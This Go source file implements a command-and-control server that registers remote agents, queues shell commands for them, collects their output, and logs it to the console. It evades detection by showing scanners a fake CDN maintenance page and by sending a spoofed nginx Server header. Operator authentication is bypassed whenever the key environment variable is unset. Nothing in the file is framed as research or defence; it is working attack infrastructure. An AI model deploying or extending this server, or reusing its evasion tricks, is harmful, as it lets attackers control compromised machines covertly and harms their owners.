package main

import (
"encoding/json"
"fmt"
"log"
"net/http"
"os"
"strings"
"sync"
"time"
)

// ============ DECOY ============

const decoyHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NexaCloud - Edge Delivery Network</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            color: #1e293b;
        }
        .container {
            max-width: 700px;
            background: white;
            padding: 50px 60px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
            text-align: center;
            border: 1px solid #e9eef3;
        }
        .badge {
            display: inline-block;
            background: #f1f5f9;
            padding: 6px 20px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 500;
            color: #475569;
            letter-spacing: 0.3px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            margin: 0 0 12px 0;
            color: #0f172a;
        }
        .subtitle {
            font-size: 18px;
            color: #475569;
            margin: 0 0 24px 0;
            line-height: 1.6;
        }
        .status-box {
            background: #fef9e7;
            border: 1px solid #fde68a;
            border-radius: 12px;
            padding: 18px 24px;
            margin: 24px 0 20px 0;
            font-size: 15px;
            color: #92400e;
        }
        .ref {
            font-size: 13px;
            color: #94a3b8;
            margin: 24px 0 0 0;
            letter-spacing: 0.2px;
        }
        .footer {
            margin-top: 32px;
            padding-top: 20px;
            border-top: 1px solid #f1f5f9;
            font-size: 13px;
            color: #94a3b8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="badge">EDGE DELIVERY NETWORK</div>
        <h1>Service Maintenance</h1>
        <p class="subtitle">
            We are currently performing scheduled upgrades to our content delivery infrastructure.
            All services will be restored shortly.
        </p>
        <div class="status-box">
            <strong>Status:</strong> Maintenance Window Active &bull; Expected completion in 15-30 minutes
        </div>
        <p class="ref">Reference: CE-2026-MAINT-009 &bull; Incident ID: NX-EDGE-2847</p>
        <div class="footer">
            &copy; 2026 NexaCloud &bull; <span style="color:#cbd5e1;">v3.2.1</span>
        </div>
    </div>
</body>
</html>`

func serveDecoy(w http.ResponseWriter) {
w.Header().Set("Content-Type", "text/html; charset=utf-8")
w.Header().Set("Server", "nginx/1.24.0")
w.Header().Set("X-Content-Type-Options", "nosniff")
w.WriteHeader(http.StatusOK)
w.Write([]byte(decoyHTML))
}

// ============ GATEWAY ============

const (
headerOperatorKey = "X-Operator-Key"
headerBeaconToken = "X-Beacon-Token"
)

func getOperatorKey() string {
return os.Getenv("ANGEL_OPERATOR_KEY")
}

func validateOperatorKey(key string) bool {
expected := getOperatorKey()
if expected == "" {
return true
}
return strings.EqualFold(key, expected)
}

func isBeaconRequest(headers map[string][]string) bool {
for key, values := range headers {
if strings.EqualFold(key, headerBeaconToken) {
if len(values) > 0 && values[0] != "" {
return true
}
}
}
return false
}

func isOperatorRequest(headers map[string][]string) bool {
for key, values := range headers {
if strings.EqualFold(key, headerOperatorKey) {
if len(values) > 0 && values[0] != "" {
return validateOperatorKey(values[0])
}
}
}
return false
}

type visitorType int

const (
visitorScanner visitorType = iota
visitorAgent
visitorOperator
visitorUnknown
)

func determineVisitorType(r *http.Request) visitorType {
if isBeaconRequest(r.Header) {
return visitorAgent
}
if isOperatorRequest(r.Header) {
return visitorOperator
}
if strings.HasPrefix(r.URL.Path, "/login") {
return visitorScanner
}
return visitorScanner
}

// ============ SERVER ============

type Agent struct {
ID       string `json:"id"`
Hostname string `json:"hostname"`
OS       string `json:"os"`
LastSeen int64  `json:"last_seen"`
}

type Task struct {
ID        string `json:"id"`
AgentID   string `json:"agent_id"`
Command   string `json:"command"`
Status    string `json:"status"`
CreatedAt int64  `json:"created_at"`
}

var (
agents   = make(map[string]Agent)
tasks    = make(map[string][]Task)
taskID   = 0
agentsMu sync.Mutex
tasksMu  sync.Mutex
)

func registerHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var agent Agent
if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

agentsMu.Lock()
agent.LastSeen = time.Now().Unix()
agents[agent.ID] = agent
agentsMu.Unlock()

w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
}

func taskHandler(w http.ResponseWriter, r *http.Request) {
vt := determineVisitorType(r)
if vt == visitorScanner || vt == visitorUnknown {
serveDecoy(w)
return
}

if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var req map[string]string
if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

agentID := req["agent_id"]

agentsMu.Lock()
_, exists := agents[agentID]
agentsMu.Unlock()
if !exists {
http.Error(w, "Agent not found", http.StatusNotFound)
return
}

if cmd, ok := req["command"]; ok && cmd != "" {
tasksMu.Lock()
taskID++
task := Task{
ID:        fmt.Sprintf("task-%d", taskID),
AgentID:   agentID,
Command:   cmd,
Status:    "pending",
CreatedAt: time.Now().Unix(),
}
tasks[agentID] = append(tasks[agentID], task)
tasksMu.Unlock()

w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "task_added"})
return
}

tasksMu.Lock()
agentTasks := tasks[agentID]
var pendingTask *Task
for i := range agentTasks {
if agentTasks[i].Status == "pending" {
pendingTask = &agentTasks[i]
break
}
}
tasksMu.Unlock()

if pendingTask != nil {
tasksMu.Lock()
for i := range tasks[agentID] {
if tasks[agentID][i].ID == pendingTask.ID {
tasks[agentID][i].Status = "assigned"
break
}
}
tasksMu.Unlock()
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]interface{}{"command": pendingTask.Command})
} else {
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]interface{}{"command": nil})
}
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
if r.Method != http.MethodPost {
http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
return
}

var result map[string]string
if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
http.Error(w, "Invalid request", http.StatusBadRequest)
return
}

fmt.Printf("[+] Result from %s: %s\n", result["agent_id"], result["output"])
w.Header().Set("Content-Type", "application/json")
json.NewEncoder(w).Encode(map[string]string{"status": "recorded"})
}

func main() {
http.HandleFunc("/register", registerHandler)
http.HandleFunc("/task", taskHandler)
http.HandleFunc("/result", resultHandler)

fmt.Println("[+] C2 server running on port 8001")
log.Fatal(http.ListenAndServe(":8001", nil))
}
